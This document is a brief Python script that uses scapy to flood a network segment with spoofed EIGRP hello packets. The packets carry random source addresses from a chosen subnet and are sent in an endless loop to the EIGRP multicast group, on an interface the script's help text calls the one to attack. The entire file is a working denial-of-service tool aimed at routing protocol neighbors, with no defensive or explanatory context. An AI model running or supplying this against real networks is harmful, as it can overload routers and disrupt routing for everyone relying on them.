#!/usr/bin/python3

#by C0ldheim


from scapy.all import *
from scapy.contrib.eigrp import *
from scapy.layers.l2 import *
import argparse


L2Multicast = "01:00:5E:00:00:0A"
EIGRPMulticast = "224.0.0.10"


def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("--interface", type=str, dest="interface", required=True, help="Choose the interface to attack")
    parser.add_argument("--asn", type=int, dest="asn", required=True, help="EIGRP Autonomous System Number")
    parser.add_argument("--subnet", type=str, dest="subnet", required=True, help="Specifying the subnet. Example: 10.10.10.0/24")
    
    args = parser.parse_args()

    return args


args = get_arguments()


def sprayhello(interface, asn, subnet):
    frame = Ether(dst=L2Multicast)
    ip = IP(src=RandIP(args.subnet), dst=EIGRPMulticast)
    eigrp = EIGRP(opcode=5, asn=args.asn, seq=0, ack=0)
    crafted = frame/ip/eigrp
    sendp(crafted, iface=args.interface, loop=1, verbose=1)

sprayhello(args.interface, args.asn, args.subnet)
